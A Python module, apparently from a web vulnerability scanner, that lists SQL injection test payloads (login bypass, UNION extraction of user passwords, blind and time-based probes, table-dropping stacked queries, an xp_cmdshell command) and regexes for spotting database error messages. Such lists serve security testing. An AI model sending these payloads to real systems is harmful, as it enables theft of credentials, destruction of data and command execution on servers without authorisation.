"""
SQL注入Payload库

包含常见的SQL注入测试向量和检测模式
"""

# SQL注入Payload
SQL_PAYLOADS = [
    # 基础注入测试
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1--",
    "admin'--",
    "admin' #",
    "admin'/*",
    
    # UNION注入
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    
    # 错误基于的注入
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND 1=CAST((SELECT @@version) AS int)--",
    
    # 布尔盲注
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND 1=1 AND 'a'='a",
    "' AND 1=2 AND 'a'='a",
    
    # 时间盲注
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    
    # Stacked queries
    "'; DROP TABLE users--",
    "'; EXEC sp_msforeachtable 'DROP TABLE ?'--",
    
    # MySQL特定
    "' OR '1'='1' LIMIT 1--",
    "' OR 1=1 LIMIT 1--",
    
    # PostgreSQL特定
    "'; SELECT pg_sleep(5)--",
    
    # MSSQL特定  
    "'; EXEC xp_cmdshell('dir')--",
    
    # 编码绕过
    "%27%20OR%20%271%27%3D%271",
    "&#39; OR &#39;1&#39;=&#39;1",
    
    # Syntax breaking (Useful for error-based detection)
    "'))",
    "'));",
    "';--",
    "'))--",
]

# SQL错误信息检测模式
SQL_DETECTION_PATTERNS = [
    # MySQL错误
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySQL Query fail",
    r"SQL syntax.*MariaDB server",
    
    # PostgreSQL错误
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    
    # MSSQL错误
    r"Driver.*SQL[\-\_\ ]*Server",
    r"OLE DB.*SQL Server",
    r"(\W|\A)SQL Server.*Driver",
    r"Warning.*mssql_",
    r"Microsoft SQL Native Client error",
    
    # Oracle错误
    r"\bORA-[0-9][0-9][0-9][0-9]",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*\Woci_",
    
    # SQLite错误
    r"SQLite/JDBCDriver",
    r"SQLite.Exception",
    r"System.Data.SQLite.SQLiteException",
    r"SQLITE_ERROR",
    
    # 通用SQL错误
    r"Warning.*SQLite3::",
    r"\[SQL Server\]",
    r"ODBC SQL Server Driver",
    r"SQLite error",
    r"syntax error",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
]
